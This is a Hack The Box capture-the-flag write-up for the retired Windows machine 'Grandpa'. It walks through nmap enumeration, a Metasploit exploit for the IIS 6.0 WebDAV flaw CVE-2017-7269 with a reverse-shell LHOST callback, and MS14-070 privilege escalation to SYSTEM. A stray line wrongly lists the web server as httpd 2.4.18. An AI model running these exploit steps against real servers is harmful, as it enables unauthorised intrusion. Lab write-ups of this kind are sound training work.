![logo](/logo.png)

# [Grandpa- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 12 Apr 2017 as the eleventh machine on HTB,Granpa created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *HFS
  *HttpFileserver
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/grandpa 10.10.10.14
```

###### Output 

![](/Windows/Windows-Easy/Grandpa/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/grandpa 10.10.10.14                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 19:42 EAT
Nmap scan report for 10.10.10.14
Host is up (0.35s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Mon, 12 Aug 2024 16:43:23 GMT
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.17 seconds
```

looking at the results  we find out that there is 1 ports open and its a `Windows`and its running an `Microsoft IIS httpd 6.0`. 

port[80]-  httpd 2.4.18

when we naviagate to [http://10.10.10.14](http://10.10.10.14)  we find a page that say it under construction 

![](/Windows/Windows-Easy/Grandpa/Screenshots/under.png)

so we know the machine version so what we are going to do is to search for the exploit 

```sh
searchsploit Microsoft IIS 6.0 
```

![](/Windows/Windows-Easy/Grandpa/Screenshots/searchsploit.png)

Some searching reveals a remote code execution vulnerability (CVE-2017-7269). There is a proof of concept that requires some modification, as well as a Metasploit module. Lets examine the Remote Buffer Overflow

![](/Windows/Windows-Easy/Grandpa/Screenshots/py.png)

After Examining the exploit we now Import it to our working directory.

# Exploitation

Executing the Metasploit module `windows/iis/iis_webdav_scstoragepathfromurl` immediately grants a shell.

```sh
use windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.14
set RPORT 80
set LHOST 10.10.14.15
run
```

![](/Windows/Windows-Easy/Grandpa/Screenshots/shell.png)

now that the meterpreter is refusing to get some infomation we just load the shell and do a `systeminfo` so that we can be able to see if their are hot fixes 

![](/Windows/Windows-Easy/Grandpa/Screenshots/systeminfo.png)

we find that their is only one hotfix that is done

![](/Windows/Windows-Easy/Grandpa/Screenshots/hotfix.png)

we noticed that it running a 32 bit meterpreter so lets migrate to a 32 bit meterpreter with `NT Authority` and be able to run a `local suggester`

After migrating we can now be able to run `sysinfo`

![](/Windows/Windows-Easy/Grandpa/Screenshots/sysinfo.png)

now i run suggester to find exploits which are vulnerable

```sh
search local_exploit_suggester
use multi/recon/local_exploit_suggester
```

![](/Windows/Windows-Easy/Grandpa/Screenshots/suggester.png)

looking at the results we find that their are a couple of exploits 

![](/Windows/Windows-Easy/Grandpa/Screenshots/exploits.png)

In this case lets try this exploit `exploit/windows/local/ms14_070_tcpip_ioctl`

```sh
use exploit/windows/local/ms14_070_tcpip_ioctl
```

![](/Windows/Windows-Easy/Grandpa/Screenshots/shell2.png)

and just that way we get shell

![](/Windows/Windows-Easy/Grandpa/Screenshots/shellroot.png)

we can get the user flag from `C:\Documents and Settings\Harry\Desktop`

![](/Windows/Windows-Easy/Grandpa/Screenshots/userflag.png)

we can get the root flag from `C:\Documents and Settings\Administrator\Desktop\root.txt`

![](Windows/Windows-Easy/Grandpa/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------



